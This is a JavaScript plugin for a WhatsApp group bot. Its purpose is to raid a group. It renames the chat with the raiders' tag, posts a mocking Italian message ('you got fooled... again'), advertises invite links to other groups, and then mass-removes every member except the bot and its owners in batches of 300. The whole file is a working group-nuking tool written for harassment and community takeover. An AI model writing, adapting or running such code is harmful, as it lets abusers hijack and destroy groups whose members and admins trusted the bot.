const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

let handler = async (m, { conn, participants, usedPrefix, command }) => {
    const groupMetadata = await conn.groupMetadata(m.chat)
    const groupName = groupMetadata.subject
    
    const isCommunity = groupMetadata.isCommunity || groupMetadata.isCommunityAnnounce
    
    let newName = `${groupName} | SVT ꪶ 𖤓 ꫂ`
    try {
        await conn.groupUpdateSubject(m.chat, newName)
    } catch (e) {
        console.error("Errore cambio nome:", e)
    }

    const botJid = conn.decodeJid(conn.user.id)
    
    let protectedIds = [botJid]
    global.owner.forEach(owner => {
        if (owner[0]) protectedIds.push(owner[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net')
        if (owner[3]) protectedIds.push(owner[3].replace(/[^0-9]/g, '') + '@lid')
    })
    
    const toKick = participants.filter(p => {
        const id = p.id || p.jid
        return !protectedIds.includes(id)
    }).map(p => p.id || p.jid)

    if (toKick.length === 0) return m.reply('『 ⚠️ 』- `Non ci sono utenti da espellere (esclusi proprietari e bot).`')

    await m.reply(`Ahahah sfigati. vi siete fatti fregare...\nancora...🥀\n> - ꪶ 𖤓 ꫂ`)
    
    await delay(1000)
    
    await m.reply(`*𝐒Δ𝐃 ꪶ 𖤓 ꫂ & 𝐂𝐇ΔΘ𝐒 𝐃Θ𝐌𝐈𝐍ΔNΘ🥲*\n*𖤓  𝐓𝐔𝐓𝐓𝐈 𝐐𝐔Δ  𖤓*\nhttps://chat.whatsapp.com/IJlJYoKmXkvK3z1pFjVR71?mode=hq1tcla\n&\nhttps://chat.whatsapp.com/Dxs0qwJJboc0uJ66ou8Nl4?mode=gi_t`)

    const batchSize = 300
    for (let i = 0; i < toKick.length; i += batchSize) {
        const batch = toKick.slice(i, i + batchSize)
        await conn.groupParticipantsUpdate(m.chat, batch, 'remove').catch(e => console.error("Errore kick batch:", e))
    }
}

handler.help = ['qa', 'quitall']
handler.tags = ['owner']
handler.command = ['777','svt', 'giuse', 'abusa', 'svuota', 'kiwi']

handler.owner = true
handler.group = true
handler.botAdmin = true

export default handler